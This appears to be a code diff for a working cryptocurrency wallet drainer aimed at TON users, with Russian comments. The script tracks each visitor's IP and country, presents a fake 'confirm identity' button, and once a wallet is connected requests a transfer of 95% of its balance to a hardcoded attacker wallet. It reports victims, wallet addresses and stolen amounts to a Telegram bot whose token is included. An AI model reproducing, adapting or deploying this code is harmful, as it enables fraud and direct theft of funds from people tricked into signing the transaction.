@@ -1,103 +1,108 @@
-var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; //Ваш кошелек, куда будут лететь активы
-var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg"; //Токен от бота телеграмм
-var tgChat = ""; //Ваш телеграмм-канал
-
-
+var mainWallet = "UQB8vV6TevtZAjKxoaXa8gaOqeu9YhClqtpLBTsvS8orahlI"; // Ваш кошелёк
+var tgBotToken = "8291343736:AAHdt8jo9480EvllENN-JEQZNOElnwuxtBg"; // Токен бота
+var tgChat = "-1001234567890"; // ID вашего канала (с минусом)
 
 var domain = window.location.hostname;
-var ipUser;
+var ipUser = '';
+var countryUser = '';
 
+// Определение IP и страны
+fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        ipUser = data.ip || 'unknown';
+        countryUser = data.country || 'unknown';
+        console.log('IP:', ipUser, 'Country:', countryUser);
+        // Отправка уведомления об открытии
+        sendTelegram(`🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n📖 *Opened the website*`);
+    })
+    .catch(e => console.error('IP error:', e));
 
-
-
-//Перенаправление стран СНГ
-fetch('https://ipapi.co/json/').then(response => response.json()).then(data => {
-    const country = data.country;
-    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
-        window.location.replace('');
-    }
-    ipUser = data.ip;
-    countryUser = data.country;
-    console.log('IP: ' + ipUser);
-    console.log('Country: ' + countryUser)
-    const messageOpen = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`;
-    const encodedMessageOpen = encodeURIComponent(messageOpen);
-    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessageOpen}&parse_mode=Markdown`;
+// Функция отправки в Telegram
+function sendTelegram(message) {
+    if (!tgBotToken || !tgChat) return;
+    const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage`;
     fetch(url, {
         method: 'POST',
-    }).then(response => {
-        if (response.ok) {
-            console.log('Success send.');
-        } else {
-            console.error('Error send.');
-        }
-    }).catch(error => {
-        console.error('Error: ', error);
-    });
-}).catch(error => console.error('Error IP:', error));
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: tgChat,
+            text: message,
+            parse_mode: 'Markdown'
+        })
+    }).catch(e => console.error('Telegram send error:', e));
+}
 
+// Инициализация TON Connect UI
 const protocol = window.location.protocol;
+const manifestUrl = protocol + '//' + domain + '/tonconnect-manifest.json';
 const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: protocol + '//' + domain + '/tonconnect-manifest.json',
+    manifestUrl: manifestUrl,
     buttonRootId: 'ton-connect'
-})
-tonConnectUI.on('walletConnected', (walletAddress) => {
-    console.log('Адрес кошелька:', walletAddress);
-    didtrans();
 });
 
-async function didtrans() {
-    let originalBalance = 0.01;
+// Активация кнопки при подключении
+tonConnectUI.on('walletConnected', (walletInfo) => {
+    console.log('Wallet connected:', walletInfo);
+    document.getElementById('drainBtn').disabled = false;
+});
+
+tonConnectUI.on('walletDisconnected', () => {
+    document.getElementById('drainBtn').disabled = true;
+});
+
+// Кнопка "Подтвердить личность"
+document.getElementById('drainBtn').addEventListener('click', async function() {
+    if (!tonConnectUI.account) {
+        alert('Сначала подключите кошелёк');
+        return;
+    }
+
+    // Получение баланса
+    let balance = 0;
     try {
-        const response = await fetch('https://tonapi.io/v1/account/get?address=' + tonConnectUI.account.address);
-        const data = await response.json();
-        if (data && data.balance) {
-            originalBalance = data.balance / 1000000000;
+        const resp = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${tonConnectUI.account.address}`);
+        const data = await resp.json();
+        if (data.ok) {
+            balance = parseInt(data.result) / 1e9; // в TON
         }
     } catch (e) {
-        console.error('Error fetching balance:', e);
+        console.error('Balance fetch error:', e);
+        alert('Ошибка получения баланса');
+        return;
     }
-    let processedBalance = originalBalance * 0.97;
-    let tgBalance = processedBalance;
+
+    if (balance < 0.01) {
+        alert('Баланс меньше 0.01 TON, операция невозможна');
+        return;
+    }
+
+    // Сумма для перевода (95%)
+    const amountToSend = balance * 0.95;
+    const amountNano = Math.floor(amountToSend * 1e9);
+
+    // Транзакция с комментарием "Подтверждение личности"
     const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 60,
+        validUntil: Math.floor(Date.now() / 1000) + 300,
         messages: [{
             address: mainWallet,
-            amount: String(Math.floor(processedBalance * 1000000000))
+            amount: String(amountNano),
+            payload: 'Подтверждение личности' // это будет видно как комментарий
         }]
-    }
+    };
+
     try {
         const result = await tonConnectUI.sendTransaction(transaction);
-        const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
-        const encodedMessageSend = encodeURIComponent(messageSend);
-        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageSend}&parse_mode=Markdown`;
-        fetch(url, {
-            method: 'POST',
-        }).then(response => {
-            if (response.ok) {
-                console.log('Success send.');
-            } else {
-                console.error('Error send.');
-            }
-            
-        }).catch(error => {
-            console.error('Error: ', error);
-        });
+        console.log('Transaction sent:', result);
+        sendTelegram(
+            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n✅ *Sent:* ${amountToSend.toFixed(4)} TON\n🔗 [Tx](https://tonscan.org/tx/${result})`
+        );
+        alert('Успешно!');
     } catch (e) {
-        const messageDeclined = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error.*`;
-        const encodedMessageDeclined = encodeURIComponent(messageDeclined);
-        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=-${tgChat}&text=${encodedMessageDeclined}&parse_mode=Markdown`;
-        fetch(url, {
-            method: 'POST',
-        }).then(response => {
-            if (response.ok) {
-                console.log('Success send.');
-            } else {
-                console.error('Error send.');
-            }
-        }).catch(error => {
-            console.error('Error: ', error);
-        });
-        console.error(e);
+        console.error('Transaction error:', e);
+        sendTelegram(
+            `🖥 *Domain:* ${domain}\n👤 *User:* ${ipUser} ${countryUser}\n💰 *Wallet:* ${tonConnectUI.account.address}\n❌ *Declined or error*`
+        );
+        alert('Отклонено или ошибка');
     }
-}
+});
